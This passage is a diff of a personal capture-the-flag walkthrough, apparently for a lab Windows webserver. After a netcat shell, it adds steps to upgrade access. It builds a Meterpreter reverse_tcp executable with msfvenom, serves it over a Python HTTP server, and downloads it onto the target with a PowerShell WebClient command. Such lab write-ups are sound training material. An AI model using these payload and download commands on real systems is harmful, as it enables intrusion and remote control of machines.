@@ -81,4 +81,23 @@ How TF are we gonna do this? lol i think we will need to use the exploit that we
 	3. ![[Pasted image 20251018210222.png]]
 	4. We will get a shell back on our Netcat Listener 
 	5. ![[Pasted image 20251018210247.png]]
-# Upgrading the Current 
+# Upgrading the Current Shell
+1. Lets generate a MSFvenom payload 
+2. Create a Meterpreter Listener 
+3. Upload the payload via our current Netcat Shell
+
+## Generate MSFVenom Payload
+Since we already have a shell via netcat on the webserver, which is a windows machine, we can create a windows payload by using the following
+```
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.9.0.124 LPORT=7777 -f exe -o reverse.exe
+```
+## Setup a http server to serve the payload
+Lets set up the http.server hosting our payload so that we can download it from the target machine 
+```
+python3 -m http.server 9090
+```
+## Download the Pay Via the Netcat Shell
+Using netcat, let us download the payload via the following command
+```
+(New-Object Net.WebClient).DownloadFile('https://example.com/file.exe', 'c:\windows\system32\inetsrv\clown.exe')
+```
